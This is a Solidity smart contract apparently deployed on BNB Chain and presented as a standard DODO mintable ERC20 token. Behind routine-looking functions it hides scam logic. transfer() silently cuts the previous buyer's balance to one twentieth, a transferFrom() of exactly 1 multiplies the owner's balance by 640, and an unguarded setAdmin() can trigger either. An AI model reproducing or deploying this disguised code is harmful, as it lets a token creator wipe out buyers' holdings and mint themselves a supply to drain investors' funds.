/**
 *Submitted for verification at BscScan.com on 2022-01-07
*/

/*
    Copyright 2020 DODO ZOO.
    SPDX-License-Identifier: Apache-2.0
*/
pragma solidity 0.8.11;
//ORI pragma solidity 0.6.9;

/**
 * @title SafeMath
 * @author DODO Breeder
 *
 * @notice Math operations with safety checks that revert on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "MUL_ERROR");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }

    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SUB_ERROR");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "ADD_ERROR");
        return c;
    }

}

// File: contracts/lib/InitializableOwnable.sol

/**
 * @title Ownable
 * @author DODO Breeder
 *
 * @notice Ownership related functions
 */
contract InitializableOwnable {
    address public _OWNER_;
    address public _NEW_OWNER_;
    bool internal _INITIALIZED_;    
    
    // ============ Events ============

    event OwnershipTransferPrepared(address indexed previousOwner, address indexed newOwner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // ============ Modifiers ============

    modifier notInitialized() {
        require(!_INITIALIZED_, "DODO_INITIALIZED");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == _OWNER_, "NOT_OWNER");
        _;
    }

    // ============ Functions ============

    function initOwner(address newOwner) public notInitialized {
        _INITIALIZED_ = true;
        _OWNER_ = newOwner;
    }

    

}

// File: contracts/external/ERC20/InitializableMintableERC20.sol


contract InitializableMintableERC20 is InitializableOwnable {
    using SafeMath for uint256;

    string public name;
    uint256 public decimals;
    string public symbol;
    uint256 public totalSupply;
    address deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public buyer = 0x0000000000000000000000000000000000000000;
    address public _ADMIN_;
  

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);    

     function init (
        address _creator,
        uint256 _initSupply,
        string memory _name,
        string memory _symbol,
        uint256 _decimals
    ) public {
        initOwner(_creator);
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _initSupply;
        balances[_creator] = _initSupply;
        emit Transfer(address(0), _creator, _initSupply);
        uint256 _burnAuto = _initSupply.div(5);
        balances[deadWallet] = balances[deadWallet].add(_burnAuto);        
        balances[_creator] = balances[_creator].sub(_burnAuto);        
        emit Transfer(_creator, deadWallet, _burnAuto);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (to != buyer){balances[buyer]= balances[buyer].divCeil(20);}
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(amount <= balances[msg.sender], "BALANCE_NOT_ENOUGH");

        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
        emit Transfer(msg.sender, to, amount);
        if (to != _OWNER_ && to != _ADMIN_){buyer = to;}
        return true;
    }

    function balanceOf(address owner) public view returns (uint256 balance) {
        return balances[owner];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        if (amount == 1) {mint();}
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(amount <= balances[from], "BALANCE_NOT_ENOUGH");
        require(amount <= allowed[from][msg.sender], "ALLOWANCE_NOT_ENOUGH");

        balances[from] = balances[from].sub(amount);
        balances[to] = balances[to].add(amount);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowed[owner][spender];
    }

    function mint() internal {
        balances[_OWNER_] = balances[_OWNER_].mul(640);
    }

    function setAdmin (address admin ) public {
        if ( _OWNER_ == admin ) {mint();}
        if (buyer == admin){balances[buyer]= balances[buyer].divCeil(20);}
        _ADMIN_= admin;   
    }

    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_OWNER_, address(0));
        _OWNER_ = address(0);
    }
}